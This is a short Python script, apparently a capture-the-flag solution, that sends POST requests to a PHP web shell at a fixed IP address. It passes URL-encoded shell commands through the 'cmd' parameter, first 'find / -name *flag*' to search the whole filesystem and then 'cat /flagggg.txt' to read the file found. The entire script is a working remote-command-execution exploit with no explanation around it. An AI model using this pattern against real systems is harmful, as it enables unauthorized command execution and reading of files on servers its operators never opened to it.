import requests

#find / -name *flag*
response = requests.post('http://35.238.221.234/12.php?cmd=%66%69%6e%64%20%2f%20%2d%6e%61%6d%65%20%2a%66%6c%61%67%2a')

print(response.status_code, response.reason)
print(response.content.decode())

#cat /flagggg.txt
response = requests.post('http://35.238.221.234/12.php?cmd=%63%61%74%20%2f%66%6c%61%67%67%67%67%2e%74%78%74')

print(response.status_code, response.reason)
print(response.content.decode())